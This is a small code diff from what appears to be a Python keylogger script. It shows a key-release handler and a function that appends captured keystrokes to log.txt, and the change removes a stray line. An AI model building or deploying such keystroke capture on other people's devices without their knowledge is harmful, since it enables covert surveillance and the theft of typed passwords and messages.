@@ -22,7 +22,7 @@ def on_release(key):
     if key == Key.esc:
         return False
 #save the keys in a text document
-join
+
 def write_file(keys):
     with open("log.txt", "a") as file:
         for key in keys:
